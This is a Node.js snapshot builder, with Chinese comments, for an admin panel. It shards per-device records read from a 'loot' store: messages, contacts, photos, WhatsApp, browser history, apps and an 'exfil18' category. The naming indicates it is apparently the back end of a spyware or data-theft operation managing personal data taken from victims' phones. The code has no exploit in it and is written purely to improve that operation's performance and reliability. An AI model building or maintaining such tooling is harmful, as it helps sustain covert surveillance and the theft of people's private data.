#!/usr/bin/env node
// build_store_snapshot.js — 面板数据快照生成器 v2（分片架构，2026-09-12 大升级）
// 背景与目标：
//   · 旧架构：全量 scan → 单文件 store_snapshot.json（412MB+）→ 面板每次新版快照落地时
//     同步 readFileSync+JSON.parse 整个文件（请求路径冻结数秒~20 秒），常驻内存 1~2.7GB。
//   · 新架构：快照拆成 core（<30MB 小数据）+ feeds（全局最近流）+ dev/<serial>（单设备全量）
//     + idmap（id→设备）；面板只常驻 core，其余按需懒加载 → 首屏/详情不再被全局体积绑架。
//   · 设备数据完整性：dev 分片不参与全局裁剪（7P「数据消失」根因之一被移除）。
//   · 过渡期双写旧格式（SNAPSHOT_KEEP_LEGACY=1，默认开），读端 SNAPSHOT_SPLIT=0 可一键回滚。
// 用法: /usr/bin/node tools/build_store_snapshot.js   （LOOT_DIR 默认 <BASE>/loot）
const fs = require('fs');
const path = require('path');
const BASE = '/www/wwwroot/i.131422.com';
process.env.LOOT_DIR = process.env.LOOT_DIR || path.join(BASE, 'loot');
const ls = require(path.join(BASE, 'adm888app', 'lootStore.js'));
const OUT = path.join(BASE, 'adm888app', 'data', 'store_snapshot.json');
const SDIR = process.env.SNAPSHOT_DIR || path.join(BASE, 'adm888app', 'data', 'snapshot');   // 【B】影子测试可覆盖
const KEEP_LEGACY = String(process.env.SNAPSHOT_KEEP_LEGACY || '1') !== '0';

const t0 = Date.now();
// 【2026-09-13 增量构建】24h 强制全量保险：每次「距上次强制全量 > 24h」时忽略桶缓存，
//   全量重扫一遍（覆盖写/漏网差异每日修正；首轮无标记文件 → 直接强制）。
const BC_MARK_DIR = path.join(BASE, 'adm888app', 'data', 'scan_cache');
const BC_FORCE_MARK = path.join(BC_MARK_DIR, '.last_force_full');
let _forceAll = false;
try {
  const _last = Number(fs.readFileSync(BC_FORCE_MARK, 'utf8')) || 0;
  _forceAll = (Date.now() - _last) > 24 * 3600 * 1000;
} catch { _forceAll = true; }
const s = ls.scan({ full: true, forceAll: _forceAll });   // 强制全量（不读快照，避免自引用）
if (_forceAll) {
  try { fs.mkdirSync(BC_MARK_DIR, { recursive: true }); fs.writeFileSync(BC_FORCE_MARK, String(Date.now())); } catch {}
  console.log('[scan-cache] 本轮为 24h 强制全量（已刷新标记）');
}
const plain = {};
for (const k of Object.keys(s)) {
  const v = s[k];
  plain[k] = (v instanceof Map) ? [...v.entries()] : v;
}

// 【复审修复 L5】空数据拒提交：users=0（数据盘掉线/权限异常）时绝不发布新版本，防把空壳快照切上线
if (!(plain.users || []).length) {
  console.error('[snapshot-v2] ★ REFUSE: users=0（数据盘掉线？）→ 不发布新版本，保留上一版');
  process.exit(3);
}

// ── 【2026-09-12】notebooks 的 dec 字段瘦身：dec = 原始解析块（单条实测可达 360KB 且同文件多记录重复），
//   前端备忘录 UI 只读 title/content/exid（不读 dec）→ 超大 dec 置空，防 feed/分片/旧格式三处体积膨胀。
{
  let slimmed = 0;
  for (const r of (plain.notebooks || [])) {
    if (r && r.dec && JSON.stringify(r.dec).length > 2048) { r.dec = {}; slimmed++; }
  }
  if (slimmed) console.log('[snapshot] notebooks dec 瘦身: ' + slimmed + ' 条');
}

// ── 分片涉及的「大数组」（进 dev 分片 + feeds；core 不含）──
const BIG = ['messages', 'notebooks', 'exfil18', 'chainLogs', 'browserHistory', 'contacts',
  'photos', 'sysApps', 'uploads', 'reports', 'events', 'apps', 'whatsapp'];

// feeds（全局「最近流」）上限 —— 全局列表页只消费「最近」；【2026-09-12 复审调整】整体上调：
//   原 10k/15k 口径把前端"共 N 条"显示砍太狠、apps 聚合口径变小（复审 M1）；单设备全量仍以 dev 分片为准。
const FEED = {
  photos: 20000, notebooks: 8000, contacts: 20000, messages: 30000, whatsapp: 8000,
  browserHistory: 20000, exfil18: 20000, chainLogs: 20000, uploads: 10000,
  reports: 12000, events: 12000, apps: 35000, sysApps: 12000,
};
// dev 分片每类安全上限（防单设备异常数据撑爆单文件；当前实测远低于此）
const DEVCAP = {
  photos: 8000, notebooks: 3000, contacts: 5000, messages: 8000, whatsapp: 3000,
  browserHistory: 8000, exfil18: 20000, chainLogs: 5000, uploads: 3000,
  reports: 2000, events: 2000, apps: 3000, sysApps: 5000,
};
// 旧格式（过渡期双写）裁剪上限 + 每设备保底：全局仍保最新 N 条，另为每台设备保最近 K 条
const TRIM = {
  chainLogs: 60000, notebooks: 6000, messages: 80000, exfil18: 100000,
  browserHistory: 40000, sysApps: 60000, contacts: 60000, photos: 40000,
  uploads: 30000, reports: 15000, events: 15000, whatsapp: 6000, apps: 35000,
};
const RESERVE = {
  photos: 10, notebooks: 10, contacts: 10, messages: 20, whatsapp: 10,
  browserHistory: 10, exfil18: 10, chainLogs: 10, uploads: 10,
  reports: 10, events: 10, apps: 10, sysApps: 10,
};

const recSerial = x => String((x && (x.serial || x.serial_id)) || '');
const crypto = require('crypto');
// 【复审修复 L5】超长 serial 的文件名保护：encodeURIComponent 后 >180 字符用 md5（读端 lootStore 同规则）
const devFileName = ser => {
  const e = encodeURIComponent(ser);
  return (e.length <= 180 ? e : 'md5_' + crypto.createHash('md5').update(ser).digest('hex')) + '.json';
};

// ── ① 分片输出（基于未裁剪全量数据）──────────────────────────────────
const tSplit = Date.now();
const ver = 'v' + Date.now();
const vdir = path.join(SDIR, ver);
fs.mkdirSync(path.join(vdir, 'feeds'), { recursive: true });
fs.mkdirSync(path.join(vdir, 'dev'), { recursive: true });

// ── 【B · 增量发布】manifest + hardlink：未变化的文件不重写，直接硬链接复用上一版 ──
//   代码级约束：被硬链接的文件【永不原地改写】——本脚本只为"新内容"创建新文件，
//   版本清理/替换一律 unlink/rename，绝不 open(...,'w') 已发布过的 inode。
let _prevManifest = null, _prevDir = null;
try {
  const _ptr = fs.readFileSync(path.join(SDIR, 'POINTER'), 'utf8').trim();
  if (/^v\d+$/.test(_ptr)) {
    const _mf = path.join(SDIR, _ptr, 'manifest.json');
    if (fs.existsSync(_mf)) { _prevManifest = JSON.parse(fs.readFileSync(_mf, 'utf8')); _prevDir = path.join(SDIR, _ptr); }
  }
} catch { /* 无上版或旧版无 manifest → 退化为全量写（兼容） */ }
const _newManifest = {};
let _linkHit = 0, _linkMiss = 0;
// 规范化哈希：剔除每轮全局重排的易变序号字段（id / user_id）——它们不具跨版本语义，
//   只影响"复用判定"，不影响文件内容本身（被复用的旧文件保留旧序号，与现状中"序号本就每轮变化"一致）。
const jsonNorm = o => JSON.stringify(o, (k, v) => (k === 'id' || k === 'user_id') ? undefined : v);
const writeOrLinkVer = (rel, obj) => {
  const target = path.join(vdir, rel);
  const h = crypto.createHash('sha1').update(jsonNorm(obj)).digest('hex');
  let linked = false;
  if (_prevManifest && _prevDir && _prevManifest[rel] && _prevManifest[rel].h === h) {
    try { fs.linkSync(path.join(_prevDir, rel), target); linked = true; } catch { linked = false; }
  }
  if (!linked) fs.writeFileSync(target, JSON.stringify(obj));
  if (linked) _linkHit++; else _linkMiss++;
  const size = fs.statSync(target).size;
  _newManifest[rel] = { h, s: size };
  return { linked, size };
};

const devs = new Map();       // serial -> { <bigName>: [records] }（所有 key 恒为数组）
const ensureDev = ser => {
  let d = devs.get(ser);
  if (!d) { d = {}; for (const k of BIG) d[k] = []; devs.set(ser, d); }
  return d;
};
const idmap = { photos: {}, exfil18: {} };
const capDrop = {};
for (const name of BIG) {
  const arr = plain[name] || [];
  for (const rec of arr) {
    const ser = recSerial(rec);
    if ((name === 'photos' || name === 'exfil18') && rec && rec.id != null && ser) {
      idmap[name][String(rec.id)] = ser;
    }
    if (!ser) continue;
    ensureDev(ser)[name].push(rec);   // 【复审修复 H1】推送时不截断；截断统一改为写出时"保最新"（见下）
  }
}
// chainLogs 特殊：记录无 serial（{id, ip, ts, line}），按 ip 反查路由到相关设备；
// 【复审修复 M2】ip→serial 映射改为 deviceIps ∪ users/devices 主 IP（原只靠 deviceIps：99 台设备
//   无登记、97 个 chainLogs 源 IP 无映射 —— 属潜伏缺口，一旦命中设备页的 chainLogs 会从有变空）。
// 读端 full_detail 仍按 x.serial===s || x.ip===user.ip 过滤，行为与旧全局数组一致。
{
  const ip2ser = new Map();
  const addIp = (ip, ser) => {
    if (!ip || !ser) return;
    if (!ip2ser.has(ip)) ip2ser.set(ip, []);
    const arr = ip2ser.get(ip);
    if (arr.indexOf(ser) === -1) arr.push(ser);
  };
  for (const [ser, ips] of Object.entries(plain.deviceIps || {})) {
    for (const ip of (Array.isArray(ips) ? ips : [])) addIp(ip, ser);
  }
  for (const [, u] of (plain.users || [])) if (u && u.serial_id) addIp(u.ip, u.serial_id);
  for (const [, dv] of (plain.devices || [])) if (dv && dv.serial_id) addIp(dv.ip, dv.serial_id);
  for (const rec of (plain.chainLogs || [])) {
    if (recSerial(rec)) continue;   // 带 serial 的已在上面的循环路由
    for (const ser of (ip2ser.get(rec.ip) || [])) ensureDev(ser).chainLogs.push(rec);
  }
}

// 【复审修复 H1】dev 分片写出：先应用每类 DEVCAP —— 按 ts 倒序保留"最新 N 条"。
//   旧实现 push 到上限即止 = 保留了最旧 N 条 → 实测 XTWWLXHP2R 设备页永久丢失最新 656 个上传包，
//   且每次重建都固定丢"最新段"，新记录永不出现。必须 slice() 副本排序，绝不原地改动 plain 引用。
const capDetail = {};
let devBytes = 0, devN = 0;
for (const [ser, d] of devs) {
  for (const name of BIG) {
    const cap = DEVCAP[name] || 0;
    const a = d[name];
    if (cap && a.length > cap) {
      d[name] = a.slice().sort((x, y) => (Number(y && y.ts) || 0) - (Number(x && x.ts) || 0)).slice(0, cap);
      capDrop[name] = (capDrop[name] || 0) + (a.length - cap);
      (capDetail[name] = capDetail[name] || []).push(ser + '(-' + (a.length - cap) + ')');
    }
  }
  const rDev = writeOrLinkVer(path.join('dev', devFileName(ser)), d);
  devBytes += rDev.size; devN++;
}

// feeds：全局「最近流」（保最新 N 条；一律按 ts 倒序落盘＝新在前——旧版升序让未排序的列表页最旧在前）
let feedBytes = 0;
for (const name of BIG) {
  let a = plain[name] || [];
  const cap = FEED[name];
  a = a.slice().sort((x, y) => (Number(y && y.ts) || 0) - (Number(x && x.ts) || 0));
  if (cap && a.length > cap) a = a.slice(0, cap);
  const rFeed = writeOrLinkVer(path.join('feeds', name + '.json'), a);
  feedBytes += rFeed.size;
}

writeOrLinkVer('idmap.json', idmap);

// core：小数据 + 预聚合（不含大数组）
const core = {};
for (const k of Object.keys(plain)) { if (BIG.includes(k)) continue; core[k] = plain[k]; }
core.__meta = { ver, built_at: Date.now(), split: 2, big: BIG };
fs.writeFileSync(path.join(vdir, 'core.json'), JSON.stringify(core));
const coreBytes = fs.statSync(path.join(vdir, 'core.json')).size;

// 【B】写出本版 manifest（下轮据此复用未变文件；缺失/损坏仅退化为全量写，不影响发布）
fs.writeFileSync(path.join(vdir, 'manifest.json'), JSON.stringify(_newManifest));

// POINTER 原子提交（所有分片写完才切版本；读端以 POINTER 为准）
const ptmp = path.join(SDIR, 'POINTER.tmp_' + process.pid);
fs.writeFileSync(ptmp, ver + '\n');
fs.renameSync(ptmp, path.join(SDIR, 'POINTER'));

// 旧版本 + 残留清理：【复审修复 L1/L2】
//   ① 清理前把 POINTER 当前指向的版本加入白名单（防"孤儿版本占位"场景把在读版本删掉）② 总保留 ≤3 份
//   ③ 顺带清理 >1 小时前的 POINTER.tmp_* 残留（崩溃在 rename 之前会遗留）。
try {
  let cur = '';
  try { cur = fs.readFileSync(path.join(SDIR, 'POINTER'), 'utf8').trim(); } catch {}
  const keep = new Set([cur, ver]);
  const removable = fs.readdirSync(SDIR).filter(x => /^v\d+$/.test(x) && !keep.has(x)).sort();
  while (removable.length > 2) {
    fs.rmSync(path.join(SDIR, removable.shift()), { recursive: true, force: true });
  }
  const now = Date.now();
  for (const f of fs.readdirSync(SDIR)) {
    if (/^POINTER\.tmp_/.test(f)) {
      try { if (now - fs.statSync(path.join(SDIR, f)).mtimeMs > 3600 * 1000) fs.unlinkSync(path.join(SDIR, f)); } catch {}
    }
  }
} catch {}

console.log('[snapshot-v2] ' + (Date.now() - tSplit) + 'ms | ver=' + ver
  + ' | core=' + (coreBytes / 1048576).toFixed(1) + 'MB'
  + ' | dev=' + devN + ' shards/' + (devBytes / 1048576).toFixed(1) + 'MB'
  + ' | feeds=' + (feedBytes / 1048576).toFixed(1) + 'MB'
  + ' | hardlink 复用=' + _linkHit + ' 新写=' + _linkMiss
  + (Object.keys(capDrop).length ? ' | capDrop=' + JSON.stringify(capDrop) : ''));
if (Object.keys(capDetail).length) console.log('[cap-drop] 保留最新、截掉最旧: ' + JSON.stringify(capDetail).slice(0, 400));

// ── ② 旧格式单文件（过渡期双写；trim + 每设备保底）──────────────────
if (KEEP_LEGACY) {
  for (const [k, max] of Object.entries(TRIM)) {
    const a = plain[k];
    if (!Array.isArray(a) || a.length <= max) continue;
    a.sort((x, y) => (Number(x && x.ts) || 0) - (Number(y && y.ts) || 0));
    let keep = a.slice(-max);
    const rsv = RESERVE[k] || 0;
    if (rsv) {
      const cnt = new Map(); const keepSet = new Set(keep);
      for (let i = a.length - 1; i >= 0; i--) {
        const ser = recSerial(a[i]); if (!ser) continue;
        const c = cnt.get(ser) || 0; if (c >= rsv) continue;
        cnt.set(ser, c + 1); keepSet.add(a[i]);
      }
      keep = a.filter(x => keepSet.has(x));
    }
    plain[k] = keep;
  }

  const tmp = OUT + '.tmp_' + process.pid;
  try {
    // 分块写：逐条 stringify + 4MB 缓冲流式落盘 —— 总字符量不再受「单字符串上限」约束
    const fd = fs.openSync(tmp, 'w');
    let buf = '';
    const flush = () => { if (buf) { fs.writeSync(fd, buf); buf = ''; } };
    const w = (str) => { buf += str; if (buf.length >= 4 * 1024 * 1024) flush(); };
    try {
      w('{');
      const keys = Object.keys(plain);
      for (let i = 0; i < keys.length; i++) {
        const k = keys[i];
        if (i) w(',');
        w(JSON.stringify(k) + ':');
        const v = plain[k];
        if (Array.isArray(v)) {
          w('[');
          for (let j = 0; j < v.length; j++) { if (j) w(','); w(JSON.stringify(v[j])); }
          w(']');
        } else {
          w(JSON.stringify(v));
        }
      }
      w('}');
      flush();
    } finally { fs.closeSync(fd); }
    fs.renameSync(tmp, OUT);
  } finally {
    // 【2026-09-12】写失败（如磁盘满）时清理半成品 tmp —— 防每次失败积一个 ~100MB 垃圾文件
    try { fs.unlinkSync(tmp); } catch { /* 已被 rename 移走或不存在 */ }
  }

  console.log('[snapshot] ' + (Date.now() - t0) + 'ms | ' + (fs.statSync(OUT).size / 1048576).toFixed(1) + 'MB'
    + ' | users=' + (plain.users || []).length + ' exfil18=' + (plain.exfil18 || []).length
    + ' photos=' + (plain.photos || []).length + ' uploads=' + (plain.uploads || []).length);
} else {
  console.log('[snapshot] legacy disabled (SNAPSHOT_KEEP_LEGACY=0) | total ' + (Date.now() - t0) + 'ms');
}
